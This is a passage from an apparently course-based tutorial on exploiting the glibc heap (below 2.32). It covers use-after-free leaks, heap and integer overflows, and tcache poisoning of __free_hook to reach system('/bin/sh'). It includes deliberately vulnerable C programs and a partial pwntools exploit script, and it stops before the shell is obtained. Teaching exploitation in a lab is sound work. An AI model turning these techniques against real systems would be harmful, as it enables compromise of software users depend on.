    long long uid; // 8 bytes
    long long gid; // 8 bytes
    char* name; // 8 bytes
    char* group; // 8 bytes
    char* bio; // 8 bytes
}; // total = 40 bytes = 0x28 
// when requested heap memory, will allocate 0x40? or 0x30

bool logged_in = false;
struct user* u;

void new() {
    if (logged_in) {
        free(u->name);
        free(u->group);
        free(u);
    }
    if (!u) { u = malloc(sizeof(struct user)); }
    u->bio = malloc(0x480); // allocate 0x
    u->group = malloc(0x10); // allocate 0x20
    u->name = malloc(0x10); // allocate 0x20
    edit();
    logged_in = true;
}

void edit() { 
    if (u) {
        puts("Enter a name:");
        fgets(u->name, 0x10, stdin);
        char* c = strchr(u->name, '\n');
        if (c) { *c = '\0'; }
        puts("Enter a group:");
        fgets(u->group, 0x10, stdin);
        c = strchr(u->group, '\n');
        if (c) { *c = '\0'; }
        puts("Enter a uid:");
        char buf[0x10];
        fgets(buf, 0x10, stdin);
        u->uid = strtoll(buf, NULL, 10);
        puts("Enter a gid:");
        buf[0x10];
        fgets(buf, 0x10, stdin);
        u->gid = strtoll(buf, NULL, 10);
        puts("Enter a bio:");
        fgets(u->bio, 0x480, stdin);
        c = strchr(u->bio, '\n');
        if (c) { *c = '\0'; }
    } else {
        puts("No current user");
    }
}

void print() {
    if (u) {
        printf("User: %s, group: %s, uid: %lld, gid: %lld\nBio: %s",
            u->name, u->group, u->uid, u->gid, u->bio);
    } else {
        puts("No current user");
    }
}

void delete() { // free mem
    if (u) {
        free(u->bio); // free big chunk - top chunk drops down? 
        free(u->group);
        free(u->name);
        free(u);
        //u = NULL; // properly: set u to NULL, otherwise u will still pt to already-freed
			        // memory on the heap
		// bc this program does not set u to NULL, we can still use u
		// for exploits, e.g. leaking pointers
    } else {
        puts("No current user");
    }
    logged_in = false;
}
// ... snip ...
```

The [[uaf]] program presents a user with a menu of options which can create a new `user` and access it once "logged in." It uses three different heap allocations sizes; the `name` and `group` buffers fall into the `0x20` size, the `struct user* u` is given `0x30` bytes, and the large `bio` buffer takes up `0x490` bytes. The program correctly allocates and stores the heap pointers and also correctly frees them. _However, the `delete` function does not store a`NULL` value in the global `u` pointer, meaning the `if (u)` checks in `edit` and `print` all pass._ This is a quintessential UAF vulnerability as the user can still _use_ the structure when it presumably should not exist.

It is important to note that the allocations might be modified when freed—in fact, all four in this example are. `u->bio` is put into unsorted bins because it is larger than all tcache bin sizes, and its first two quadwords are set to pointers to the `main_arena` struct in `glibc`. `u->group` is the first freed `0x20` size allocation, so its first quadword is set to `NULL` and the second is set to `tcache_perthread_struct`'s address since it falls into the `0x20` bin tcache. `u->name` is set similarly, though its first quadword will point to the next item in the `0x20` cache, the address of `u->group`. Finally, `u->uid` and `u->gid` are clobbered by `NULL` (`fw` pointer) and `tcache_perthread_struct`'s address, respectively, when it is placed in the tcache `0x30` size bin. This means we still have access to the allocations, _but their data may be frustratingly altered._ In our case, we can use a couple of these updates to our advantage.

### UAF Leaks

[](https://github.com/comed-ian/offsec-fall-2024/blob/lesson8/8.%20Attacking%20the%20Heap%20(glibc%20%3C2.32).md#uaf-leaks)

Once an allocation is freed it is placed into one of the five caches and some of the bytes in its data buffer are updated. These bytes might be changed to addresses, such as a `fw` pointer pointing to a heap or glibc address. These linked list pointers are _extremely_ valuable to us as attackers! Leaking heap pointers means we can break ASLR for objects on the heap. This is not necessarily critical for glibc <v2.32, but it is essential for later versions to bypass mitigations. It can also be useful to know the addresses of our allocations, especially when spoofing objects in higher-level languages like C++.

Targeting UAF allocations in smallbins, largebins, and unsorted bins is particularly fruitful. These caches are doubly-linked lists so the head and tail of the cache have pointers to `main_arena` in their data buffer. Printing these values back to our attacking script can help us break ASLR for glibc, which opens up other exploitation techniques. We can confirm that the program leaks valuable data by triggering the UAF and then printing the active user back to us. This shows garbled data in the output which corresponds to the linked list addresses!

```shell
$ ./uaf
Please enter an option:
 1. New user
 2. Edit user
 3. Print user
 4. Delete user
 > 1
Enter a name:
ian
Enter a group:
admin
Enter a uid:
10
Enter a gid:
10
Enter a bio:
bio here
Please enter an option:
 1. New user
 2. Edit user
 3. Print user
 4. Delete user
 > 4
Please enter an option:
 1. New user
 2. Edit user
 3. Print user
 4. Delete user
 > 3
User: ?ߖZ?U, group: , uid: 0, gid: 94069893550096
Bio: ??F?Please enter an option:
// ^ these are useful data, like glibc addr, heap addrs
```

### UAF Memory Corruption

[](https://github.com/comed-ian/offsec-fall-2024/blob/lesson8/8.%20Attacking%20the%20Heap%20(glibc%20%3C2.32).md#uaf-memory-corruption)

We passively triggered the UAF above to leak addresses, but in this example we can leverage it for even more. The `edit` functionality is still available to us because of the passing `if (u)` check, meaning we have access to the `u->name`, `u->group` and `u->bio` (`u->uid` and `u->gid` were clobbered during the free, but the other data remains). We can use this function to modify the cached allocations' data, thereby corrupting the cached pointers. Continuing where we left off with the UAF above, we see that editing the allocations and re-allocating them from the caches leads to a `malloc` error and system crash:

```
User: ?ߖZ?U, group: , uid: 0, gid: 94069893550096
Bio: ??F?Please enter an option:
 1. New user
 2. Edit user
 3. Print user
 4. Delete user
2
Enter a name:
AAAAAAAA
Enter a group:
BBBBBBBBB
Enter a uid:
10
Enter a gid:
10
Enter a bio:
CCCCCCCC
Please enter an option:
 1. New user
 2. Edit user
 3. Print user
 4. Delete user
 > 1
malloc(): unsorted double linked list corrupted
Aborted (core dumped)
```

This may not look like much, but it is encouraging! We'll talk more about how we can use this functionality and the prior leaks to _poison_ tcache. But first, let's look at another vulnerability class: heap buffer overflows.

## Heap Buffer Overflows

[](https://github.com/comed-ian/offsec-fall-2024/blob/lesson8/8.%20Attacking%20the%20Heap%20(glibc%20%3C2.32).md#heap-buffer-overflows)

Thus far we leveraged stack-based primitives, reads and writes, to achieve leaks and memory corruption. The heap is subject to similar buffer overflow vulnerabilities. The only difference is that instead of overflowing the stack, we overflow the next allocation(s) on the heap! We can see this with a trivial [[overflow.c]] example that reads into a heap buffer with `gets`:

```c
#include "stdlib.h"
#include "stdlib.h"
#include "string.h"
#include "unistd.h"

int main() {
    puts("What's your name??");
    char* name = malloc(0x20);
    char* my_name = malloc(0x10);
    strcpy(my_name, "glibc 2.31");
    gets(name);
    printf("Hello %s, my name is %s\n", name, my_name);
    return 0;
}
```

If we input less than the reserved size (`0x20` bytes requested plus `0x8` bytes of padding automatically added to the allocation) into [[overflow]], we begin clobbering data in the next allocation, thereby corrupting the stored string!

```shell
$ ./overflow 
What's your name??
AAAAAAAABBBBBBBBCCCCCCCCDDDDDDDDEEEEEEEEFFFFFFFFGGGGGGGGHHHHHHHH
Hello AAAAAAAABBBBBBBBCCCCCCCCDDDDDDDDEEEEEEEEFFFFFFFFGGGGGGGGHHHHHHHH, my name is GGGGGGGGHHHHHHHH and my favorite color is green
```

We can debug this to see exactly what our overflow does using GDB with `gef`'s `heap chunks` command to get a view of the heap. Dumping memory on the heap is an easy way to see the data within and between allocations. First we inspect the heap before the overwrite, which shows five allocations: `tcache_perthread_struct`, a `0x410` byte buffer for `stdin`'s buffer (which the system puts on the heap to store data passed returned from the kernel), and the three buffers. We can dump memory starting at the input `name` buffer (`0x5555555596b0`) to see the distance between it and the `my_name` (`0x5555555596e0`) and `my_color` (`0x555555559700`) buffer in memory:

```
gef➤  heap chunks
Chunk(addr=0x555555559010, size=0x290, flags=PREV_INUSE | IS_MMAPPED | NON_MAIN_ARENA)
    [0x0000555555559010     00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00    ................]
Chunk(addr=0x5555555592a0, size=0x410, flags=PREV_INUSE | IS_MMAPPED | NON_MAIN_ARENA)
    [0x00005555555592a0     57 68 61 74 73 20 79 6f 75 72 20 6e 61 6d 65 3f    What's your name?]
Chunk(addr=0x5555555596b0, size=0x30, flags=PREV_INUSE | IS_MMAPPED | NON_MAIN_ARENA)
    [0x00005555555596b0     00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00    ................]
Chunk(addr=0x5555555596e0, size=0x20, flags=PREV_INUSE | IS_MMAPPED | NON_MAIN_ARENA)
    [0x00005555555596e0     67 6c 69 62 63 20 32 2e 33 31 00 00 00 00 00 00    glibc 2.31......]
Chunk(addr=0x555555559700, size=0x20, flags=PREV_INUSE | IS_MMAPPED | NON_MAIN_ARENA)
    [0x0000555555559700     67 72 65 65 6e 00 00 00 00 00 00 00 00 00 00 00    green...........]
Chunk(addr=0x555555559720, size=0x208f0, flags=PREV_INUSE | IS_MMAPPED | NON_MAIN_ARENA)  ←  top chunk
gef➤  x/s 0x5555555596e0
0x5555555596e0:	"glibc 2.31"
gef➤  x/s 0x555555559700
0x555555559700:	"green"
gef➤  x/16xg 0x5555555596b0
0x5555555596b0:	0x0000000000000000	0x0000000000000000
0x5555555596c0:	0x0000000000000000	0x0000000000000000
0x5555555596d0:	0x0000000000000000	0x0000000000000021
0x5555555596e0:	0x2e32206362696c67	0x0000000000003133
0x5555555596f0:	0x0000000000000000	0x0000000000000021
0x555555559700:	0x0000006e65657267	0x0000000000000000
0x555555559710:	0x0000000000000000	0x00000000000208f1
0x555555559720:	0x0000000000000000	0x0000000000000000
```

If we send in a bunch of characters to overflow the first buffer we can see the overwrite! Also note that clobbering the metadata for the second allocation makes `gef`'s interpretation of the allocation's size go haywire:

```
gef➤  heap chunks
Chunk(addr=0x555555559010, size=0x290, flags=PREV_INUSE | IS_MMAPPED | NON_MAIN_ARENA)
    [0x0000555555559010     00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00    ................]
Chunk(addr=0x5555555592a0, size=0x410, flags=PREV_INUSE | IS_MMAPPED | NON_MAIN_ARENA)
    [0x00005555555592a0     57 68 61 74 73 20 79 6f 75 72 20 6e 61 6d 65 3f    What's your name?]
Chunk(addr=0x5555555596b0, size=0x30, flags=PREV_INUSE | IS_MMAPPED | NON_MAIN_ARENA)
    [0x00005555555596b0     41 41 41 41 41 41 41 41 42 42 42 42 42 42 42 42    AAAAAAAABBBBBBBB]
Chunk(addr=0x5555555596e0, size=0x4646464646464640, flags=PREV_INUSE | IS_MMAPPED | NON_MAIN_ARENA)
    [0x00005555555596e0     47 47 47 47 47 47 47 47 48 48 48 48 48 48 48 48    GGGGGGGGHHHHHHHH]
gef➤  x/16xg 0x5555555596b0
0x5555555596b0:	0x4141414141414141	0x4242424242424242
0x5555555596c0:	0x4343434343434343	0x4444444444444444
0x5555555596d0:	0x4545454545454545	0x4646464646464646
0x5555555596e0:	0x4747474747474747	0x4848484848484848
0x5555555596f0:	0x0000000000000000	0x0000000000000021
0x555555559700:	0x0000006e65657267	0x0000000000000000
0x555555559710:	0x0000000000000000	0x0000000000000411
0x555555559720:	0x4141414141414141	0x4242424242424242
gef➤  heap chunk 0x5555555596e0
Chunk(addr=0x5555555596e0, size=0x4646464646464640, flags=PREV_INUSE | IS_MMAPPED | NON_MAIN_ARENA)
Chunk size: 5063812098665367104 (0x4646464646464640)
Usable size: 5063812098665367088 (0x4646464646464630)
Previous chunk size: 4991471925827290437 (0x4545454545454545)
PREV_INUSE | IS_MMAPPED | NON_MAIN_ARENA
```

In the last section we talked about how we can corrupt caches with a UAF by writing to the linked list pointers in the first eight bytes of the allocation's data after it's freed. We can use a heap buffer overflow in a similar way. A heap buffer overflow occurs in an active (non-UAF) allocation, so writing to the first eight bytes does not do anything for us. But, if we set up our heap so that the overflowed chunk clobbers a cached pointer, we achieve a similar result!

Consider the modified [[overflow_cache_corruption.c]] example, where we free the two `strcpy`'d allocations prior to calling `gets`. Inspecting [[overflow_cache_corruption]]'s heap right before this call shows two allocations in tcache bin index two, the freed `my_name` allocation which points to the freed `my_color` buffer:

```
gef➤  heap chunks
Chunk(addr=0x555555559010, size=0x290, flags=PREV_INUSE | IS_MMAPPED | NON_MAIN_ARENA)
    [0x0000555555559010     02 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00    ................]
Chunk(addr=0x5555555592a0, size=0x410, flags=PREV_INUSE | IS_MMAPPED | NON_MAIN_ARENA)
    [0x00005555555592a0     41 63 74 75 61 6c 6c 79 2c 20 49 20 64 6f 6e 27    Actually, I don']
Chunk(addr=0x5555555596b0, size=0x30, flags=PREV_INUSE | IS_MMAPPED | NON_MAIN_ARENA)
    [0x00005555555596b0     00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00    ................]
Chunk(addr=0x5555555596e0, size=0x20, flags=PREV_INUSE | IS_MMAPPED | NON_MAIN_ARENA)
    [0x00005555555596e0     00 97 55 55 55 55 00 00 10 90 55 55 55 55 00 00    ..UUUU....UUUU..]
Chunk(addr=0x555555559700, size=0x20, flags=PREV_INUSE | IS_MMAPPED | NON_MAIN_ARENA)
    [0x0000555555559700     00 00 00 00 00 00 00 00 10 90 55 55 55 55 00 00    ..........UUUU..]
Chunk(addr=0x555555559720, size=0x208f0, flags=PREV_INUSE | IS_MMAPPED | NON_MAIN_ARENA)  ←  top chunk
gef➤  heap bins
────────────────────────── Tcachebins for thread 1 ──────────────────────────────
Tcachebins[idx=0, size=0x20, count=2] ←  Chunk(addr=0x5555555596e0, size=0x20, flags=PREV_INUSE | IS_MMAPPED | NON_MAIN_ARENA)  ←  Chunk(addr=0x555555559700, size=0x20, flags=PREV_INUSE | IS_MMAPPED | NON_MAIN_ARENA) 
```

If we now overflow with the same input data, the result is not clobbering the `my_name` data (`glibc 2.31`) but rather _the cached pointer_! `gef` freaks out when it tries to parse the cache, and correctly tells us that the allocation at the top of the bin is corrupted.

```
gef➤  heap chunks
Chunk(addr=0x555555559010, size=0x290, flags=PREV_INUSE | IS_MMAPPED | NON_MAIN_ARENA)
    [0x0000555555559010     02 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00    ................]
Chunk(addr=0x5555555592a0, size=0x410, flags=PREV_INUSE | IS_MMAPPED | NON_MAIN_ARENA)
    [0x00005555555592a0     41 63 74 75 61 6c 6c 79 2c 20 49 20 64 6f 6e 27    Actually, I don']
Chunk(addr=0x5555555596b0, size=0x30, flags=PREV_INUSE | IS_MMAPPED | NON_MAIN_ARENA)
    [0x00005555555596b0     41 41 41 41 41 41 41 41 42 42 42 42 42 42 42 42    AAAAAAAABBBBBBBB]
Chunk(addr=0x5555555596e0, size=0x4646464646464640, flags=PREV_INUSE | IS_MMAPPED | NON_MAIN_ARENA)
    [0x00005555555596e0     47 47 47 47 47 47 47 47 48 48 48 48 48 48 48 48    GGGGGGGGHHHHHHHH]
gef➤  heap bins
────────────────────────────────────────────────────────────────── Tcachebins for thread 1 ──────────────────────────────────────────────────────────────────
Tcachebins[idx=316488256166585441, size=0x4646464646464630, count=1] ←  Chunk(addr=0x5555555596e0, size=0x4646464646464640, flags=PREV_INUSE | IS_MMAPPED | NON_MAIN_ARENA)  ←  [Corrupted chunk at 0x5555555596e0]
```

What we have just done is called _cache corruption_, which we will talk about more and practice in the coming sections.

### Integer Overflows on the Heap

[](https://github.com/comed-ian/offsec-fall-2024/blob/lesson8/8.%20Attacking%20the%20Heap%20(glibc%20%3C2.32).md#integer-overflows-on-the-heap)

One interesting quirk with allocation sizing is that `0x0` results in a `0x20` allocation, which is odd! Some heap implementations panic or return nothing for a call to allocate zero bytes. Because glibc defaults to a`0x20` allocation, we get some interesting behavior for integer overflows. Consider the following short program, [[int_overflow.c]]:

```c
#include "stdio.h"
#include "stdlib.h"
#include "unistd.h"
#include "string.h"

int main() {
    char buf[0x10];
    puts("How long is your data?");
    fgets(buf, 0x10, stdin);
    unsigned short size = strtol(buf, NULL, 10);
    printf("You requested %hx bytes\n", size);
    unsigned short allocation_size = size + 1;
    // I want to allocate an extra byte for the null terminator, in case the
    // user does not send one!
    char* my_buffer = malloc(allocation_size);
    // allocating a secret value on the heap, this will follow the allocation
    // above
    char* my_secret = malloc(0x20);
    strcpy(my_secret, "my precious secret!");
    read(0, my_buffer, size);
    char* c = strchr(my_buffer, '\n');
    if (c != 0) { *c = '\0'; }
    else { my_buffer[size] = '\0'; }
    printf("Here's my data: %s!\n", my_buffer);
    printf("Nobody look, here's my secret: %s\n", my_secret);
    return 0;
}
```

The error here is a common one—the programmer wants to make sure the program reads the _entire_ user input with `read` and has room for a null-terminator, so they allocate a requested size plus one extra byte. The problem is it allows the user to choose a size, and there is one particular size that exposes this program to an issue. If we choose `USHRT_MAX` (65535, or `0xffff`) for our length, adding one byte turns `0xffff` to `0x10000` which unfortunately does not fit in the `unsigned short allocation_size` parameter; the value is truncated to two bytes, or `0x0000`! This results in a `0x20` allocation on the heap which is subsequently passed to a `0xffff` byte `read` call. This yields a heap overflow vulnerability, identical to the `gets` example above for up to `0xffff` bytes:

```shell
$ ./int_overflow
How long is your data?
65535
You requested ffff bytes
AAAAAAAABBBBBBBBCCCCCCCCDDDDDDDDEEEEEEEEFFFFFFFFGGGGGGGGHHHHHHHH
Here's my data: AAAAAAAABBBBBBBBCCCCCCCCDDDDDDDDEEEEEEEEFFFFFFFFGGGGGGGGHHHHHHHH!
Nobody look, here's my secret: EEEEEEEEFFFFFFFFGGGGGGGGHHHHHHHH
```

## Other Leak Strategies

[](https://github.com/comed-ian/offsec-fall-2024/blob/lesson8/8.%20Attacking%20the%20Heap%20(glibc%20%3C2.32).md#other-leak-strategies)

One important, and very useful, aspect of the glibc heap is that it tends to be lazy. We've already seen this with the lazy sorting in the unsorted bins cache. Lazy is good for performance—why spend cycles doing something that might not end up being necessary?

This is the mentality applied to `malloc`. When an allocation is returned, it is up to the user to zero-out or initialize the data buffer. In fact, the `man` page specifically highlights this behavior:

> The _malloc()_ function allocates _size_ bytes and returns a pointer to the allocated memory. The memory is not initialized

That said, this is commonly overlooked and can provide us a subtle read primitive. Consider the following example, [[leak.c]]:

```c
#include "stdio.h"
#include "stdlib.h"
#include "unistd.h"

int main() {
    void** a = malloc(0x20);
    void** b = malloc(0x20);
    printf("Address of a: 0x%p\n", a);
    printf("Address of b: 0x%p\n", b);
    free(a);
    a = NULL;
    free(b);
    b = NULL;
    a = malloc(0x20);
    printf("Address of a: 0x%p\n", a);
    printf("Data at a:    0x%p\n", *a);
    return 0;
}
```

At first glance this program does not look dangerous, there is no memory corruption nor UAF. But there is undefined behavior in this program. Because `malloc` does not initialize data, the last `printf`output is dependent upon system state. But this behavior is controllable because the heap is deterministic. We know that both `a` and `b` are freed into the `0x30` tcache bin, and that `b`'s data is updated so that the first eight bytes point to the address of `a`. When we reallocate `a` and `b`, they swap places in memory because of the LIFO nature of tcache. But `malloc` does not do anything to the existing data at either address. This means printing the data at `a` should match the original address of `a` logged above. We can confirm this in the [[leak]] program as shown below:

```
./leak
Address of a: 0x0x55e245dda2a0
Address of b: 0x0x55e245dda2d0
Address of a: 0x0x55e245dda2d0
Data at a:    0x0x55e245dda2a0
```

This is a useful primitive to keep an eye out for whenever a program does not automatically set the data returned by `malloc`.

> Note that `calloc` does not operate the same way. Any allocation made using `calloc` is automatically nulled-out. This can perhaps be advantageous to us in certain situations, but it does eliminate this leak primitive.

## Tcache Poisoning

[](https://github.com/comed-ian/offsec-fall-2024/blob/lesson8/8.%20Attacking%20the%20Heap%20(glibc%20%3C2.32).md#tcache-poisoning)

We have talked a lot about caches and reviewed a few different heap primitives, but nothing that looks close to getting us a shell. Now that we have a foundational understanding of the heap as a system, we're ready to discuss _cache poisoning_. Cache poisoning is the process of corrupting those linked list pointers to addresses of our choosing. We saw a crash earlier in the [[uaf]] and [[overflow_cache_corruption]] examples because we set linked lists pointers to some arbitrary characters. If we instead overwrite this data with an address, we have a more interesting situation.

Cache corruption is cache dependent, and we will focus specifically on tcache. Tcache is a singly linked list, which is easier to handle than the doubly-linked lists of the larger caches. What happens when we corrupt an existing tcache `fw` pointer with a valid address? When the corrupted allocation is fetched from the cache, glibc moves its `fw` pointer to the head of the bin, stored in `tcache_perthread_struct`. The subsequent request of a matching size checks `tcache` for a pointer, which exists, and returns it to the program. If we have control over the data stored in the new allocation, _we have achieved an arbitrary write_! This is an extremely powerful primitive, as _the address is not restricted to the heap_. Let's look at one useful target that can help us pop a shell when we have heap control.

### `__free_hook`

[](https://github.com/comed-ian/offsec-fall-2024/blob/lesson8/8.%20Attacking%20the%20Heap%20(glibc%20%3C2.32).md#__free_hook)

Some allocation and deallocation functions in glibc have an optional _hook_, which is essentially a function that a programmer can define to modify or augment the functions. The [GNU documentation](https://www.gnu.org/software/libc/manual/html_node/Hooks-for-Malloc.html) has a nice example of `__malloc_hook` and `__free_hook` for logging calls to the functions, which could be helpful when debugging or validating heap memory use. If a hook is defined, the initial call to the corresponding allocation/deallocation function first [calls the defined hook function](https://elixir.bootlin.com/glibc/glibc-2.31/source/malloc/malloc.c#L3095) before performing the standard glibc operations for that function. This functionality is not often used in production, however, as it adds unnecessary overhead. In such cases the addresses at these hook values are zero. In such cases the check of the hook pointer shows a null pointer, and execution continues on as normal.

Fundamentally, these hooks _divert execution flow_ by branching from a function to another. This means if we can control the value of these hooks, we can call arbitrary code! Let's dig into the code to see how we can attack this.

Shown below is [glibc's implementation of `__libc_free`](// [https://elixir.bootlin.com/glibc/glibc-2.31/source/malloc/malloc.c#L3095](https://elixir.bootlin.com/glibc/glibc-2.31/source/malloc/malloc.c#L3095)). The call to the `hook` function (if it exists) is performed with two arguments, the pointer initially passed to `free` (`mem`) and a return address for the next instruction. This means that our hook function, whatever that may be, will have a function signature `function(void* some_pointer, void* return_addr)`. We cannot control the second argument—it is populated in the function—but we very well may be able to influence the pointer passed to `free` and perhaps control the data _at_ that pointer.

```c
// glibc's malloc.c source code
void
__libc_free (void *mem)
{
  mstate ar_ptr;
  mchunkptr p;                          /* chunk corresponding to mem */

  void (*hook) (void *, const void *)
    = atomic_forced_read (__free_hook);
  if (__builtin_expect (hook != NULL, 0))
    {
      (*hook)(mem, RETURN_ADDRESS (0));
      return;
    }
// ... snip ...
}
```

Can we think of a useful function to call that takes a pointer as an argument? How about our favorite glibc function, `system`? The only argument it needs is a pointer to a string, and the address being freed will almost certainly have bytes residing in its data buffer. _If we can set `__free_hook` to `system`, set a heap buffer equal to `/bin/sh`, and free that buffer, we essentially call `system("/bin/sh")`!_


How do we gain control over `__free_hook`? It happens to be an exported address in glibc, meaning if we break ASLR for glibc we can leverage an arbitrary write to corrupt its value. What about the arbitrary write using tcache corruption we just discussed? That would certainly do! This can all come together in a beautiful series of operations, such as:

1. Leak a glibc address, perhaps via a freed unsorted bins allocation with a `main_arena` pointer in its linked list
2. Use a heap memory corruption primitive (UAF, heap buffer overflow, etc.) to poison tcache so that the address of a freed `fw` pointer now points to `__free_hook`
3. Allocate enough items from the corrupted bin so that `__free_hook` is returned as a pointer to an allocation we can control
4. Overwrite the value at `__free_hook` to be the address of `system`
5. Set another allocation's data to start with `/bin/sh\0` (make sure we have a null-terminator here)
6. Free the allocation from above. The call to `free` will check `__free_hook`, which is now populated. Glibc therefore calls the function at free hook with the pointer address to be freed, leading to a call to `system("/bin/sh\0")`

This details the shortest possible path to a shell, though in reality it may take a dozen or more steps to accomplish these goals. The key is to gauge what control we have over the heap, identify what primitives we have at our disposal, and get creative in how we use them.

Let's take everything we have learned up to this point and reinforce it with a practical example.

## Practical Example

[](https://github.com/comed-ian/offsec-fall-2024/blob/lesson8/8.%20Attacking%20the%20Heap%20(glibc%20%3C2.32).md#practical-example)

We'll put all of this together by actually popping a shell on the [[uaf]] example we saw earlier.

We already discussed the vulnerability in this program: the `delete` function frees memory but does not zero-out the global `u` structure, leading to a UAF. We leveraged this above by dumping memory on the heap, but to exploit the program we need to set up a `pwntools` solver to leverage the next stage.

It's always helpful to script functional components of the exploit, specifically interacting with each of the menu options so that we can easily call the option of choice while minimizing mistakes. The below code performs the same command-line interaction we did above to test the UAF, but this time it parses the dumped pointers. The pointers of interest here are a heap address in the `0x50` size tcache linked list and a glibc arena address for unsorted bins:

```python
from pwn import *

context.log_level = "DEBUG"
context.terminal = ["tmux", "splitw", "-h", "-f"]

p = gdb.debug("./uaf", '''
    b new
    continue
''')

def new(name, group, uid, gid, bio):
    p.sendline(b'1')
    __edit(name, group, uid, gid, bio)

def __edit(name, group, uid, gid, bio):
    p.recvuntil(b"name:\n")
    p.sendline(name)
    p.recvuntil(b"group:\n")
    p.sendline(group)
    p.recvuntil(b"uid:\n")
    p.sendline(str(uid).encode())
    p.recvuntil(b"gid:\n")
    p.sendline(str(gid).encode())
    p.recvuntil(b"bio:\n")
    p.sendline(bio)
    p.recvuntil(b" >")

def edit(name, group, uid, gid, bio):
    p.sendline(b'2')
    __edit(name, group, uid, gid, bio)

def _print():
    p.sendline(b'3')
    return p.recvuntil(b" >")

def delete():
    p.sendline(b'4')
    p.recvuntil(b" >")

p.recvuntil(b"> ")
new(b"ian", b"user", 1000, 1000, b"prof")
delete()
leak = _print()
heap_leak = leak[leak.find(b"User: ") + len(b"User: "):]
heap_leak = heap_leak[:heap_leak.find(b',')]
heap_leak = u64(heap_leak.ljust(8, b'\x00'))
print(hex(heap_leak))
glibc_leak = leak[leak.find(b"Bio: ") + len(b"Bio: "):]
glibc_leak = glibc_leak[:glibc_leak.find(b'P')]
glibc_leak = u64(glibc_leak.ljust(8, b'\x00'))
print(hex(glibc_leak))
```

The parsing above splits out the addresses, but those are not necessarily what we care most about. We actually don't need a heap address (but we leak it here because it is relevant for v2.32+), but we do need that glibc address to find `__free_hook` and `system`.

There is seemingly no good way to identify the leaked `main_arena` offset using `pwntools.elf.ELF`, (since it is not an exported symbol) so the easiest strategy for getting the glibc base is finding the current page that `main_arena` is on (`leak ~0xfff`) and subtracting the offset from that page to the libc base address during a debugging run. After that, we can create an `ELF` with this base address to store `system` and `__free_hook`'s addresses:

```python
heap_base = heap_leak & ~0xfff
glibc_base = (glibc_leak & ~0xfff) - 0x1ec000
print(hex(heap_base))
print(hex(glibc_base))

e = ELF("/lib/x86_64-linux-gnu/libc.so.6", checksec=False)
e.address = glibc_base
free_hook = e.symbols.__free_hook
system = e.symbols.system
```

Now we're set up to poison tcache. For this we need to be mindful of how objects are stored in the current heap layout and how they are fetched when we reallocate. Breaking after the leak, we see the following cache order:

```
gef➤  heap bins
────────────────────────── Tcachebins for thread 1 ──────────────────────────────
Tcachebins[idx=0, size=0x20, count=2] ←  Chunk(addr=0x55e372687ba0, size=0x20, flags=PREV_INUSE | IS_MMAPPED | NON_MAIN_ARENA)  ←  Chunk(addr=0x55e372687b80, size=0x20, flags=PREV_INUSE | IS_MMAPPED | NON_MAIN_ARENA) 
Tcachebins[idx=1, size=0x30, count=1] ←  Chunk(addr=0x55e3726876c0, size=0x30, flags=PREV_INUSE | IS_MMAPPED | NON_MAIN_ARENA) 
──────────────────── Fastbins for arena at 0x7f5bed541b80 ───────────────────────
Fastbins[idx=0, size=0x20] 0x00
Fastbins[idx=1, size=0x30] 0x00
Fastbins[idx=2, size=0x40] 0x00
Fastbins[idx=3, size=0x50] 0x00
Fastbins[idx=4, size=0x60] 0x00
Fastbins[idx=5, size=0x70] 0x00
Fastbins[idx=6, size=0x80] 0x00
────────────────── Unsorted Bin for arena at 0x7f5bed541b80 ─────────────────────
[+] unsorted_bins[0]: fw=0x55e3726876e0, bk=0x55e3726876e0
 →   Chunk(addr=0x55e3726876f0, size=0x490, flags=PREV_INUSE | IS_MMAPPED | NON_MAIN_ARENA)
[+] Found 1 chunks in unsorted bin.
```

Based on the `free` order in `delete`, we know that the tcache is as follows:

```
u --> name --> group
```

And unsorted bins is

```
main arena <--> bio <--> main arena
```

We've accomplished our goal with the `bio` in unsorted bins, but we're not quite done. We need to `edit` the dangling pointers to poison tcache, but we must also not corrupt the pointers in the freed `bio` allocation otherwise the subsequent re-allocation will fail. Since we already leaked the `main_arena` pointer, we can simply put both pointers back by sending `p64(leaked_glibc) + p64(leaked_glibc)`.

> Remember, `fgets` waits until a `\n` to finish reading, so we need to make sure we to pack those those two addresses otherwise we get a rouge `\n` in our pointer, which will corrupt the linked lists.

Now we must poison tcache. We have options here, as we can edit either `name` or `group`. But there is only one correct answer here, and the reasoning is subtle. Remember our `tcache_perthread_struct` structure? This structure keeps pointers to the heads of all tcache bins, but it also keeps _counters_ for the number of items in each bin. This makes sense, as there is a maximum capacity for each bin (seven, by default), so we need to know when it is full.

The issue with this counter is that [there is a check](https://elixir.bootlin.com/glibc/glibc-2.31.9000/source/malloc/malloc.c#L3049) when fetching from tcache that there is another item left in the cache to fetch. Our goal is to poison the cache with `__free_hook` so that we can control its value when allocated from the cache. Consider putting its address in the freed `group` pointer. What is `group`'s current `fw` pointer? Because it's the last item, it is a null pointer. Even if we poison this value to point to `__free_hook`, _it will never be returned by `malloc` because the counter will reach zero when the freed`group` is allocated_. We could keeping `malloc`ing infinitely, and we would never get that poisoned pointer back!

> This point is particularly difficult to observe in `gef`, as `gef`'s cache parsing traverses the linked lists until the end, but does not take into account the bin's count value. Consequently `gef` can be misleading and it's important to remember this note as we develop future exploits.

We do not have UAF edit capabilities for the freed `u` structure, otherwise we would be able to perhaps poison that freed allocation. So our target instead is the freed `name`, which we can edit to the address of `free_hook`. Combining that with our `bio` pointer preservation, the overwrite is as follows:

```python
edit(p64(free_hook), 'BBBBBBBB', 10, 10, p64(glibc_leak) + p64(glibc_leak))
```

We can double check this poisoning works by inspecting tcache after the `edit`. What we'll see is `gef` struggling to follow the linked list after a glibc address—this is fine, so long as the address in the linked list is `__free_hook` and it is the end of the list (we don't want glibc to try and fetch the value _at_ `free_hook`, which is likely `NULL`, as the next allocation).

```
gef➤  heap bins
────────────────────────── Tcachebins for thread 1 ──────────────────────────────
Tcachebins[idx=0, size=0x20, count=2] ←  Chunk(addr=0x55e372687ba0, size=0x20, flags=PREV_INUSE | IS_MMAPPED | NON_MAIN_ARENA)  ←  Chunk(addr=0x7ff508d41e48, size=0x0, flags=PREV_INUSE | IS_MMAPPED | NON_MAIN_ARENA) 
[!] Command 'heap bins tcache' failed to execute properly, reason: can't convert negative int to unsigned
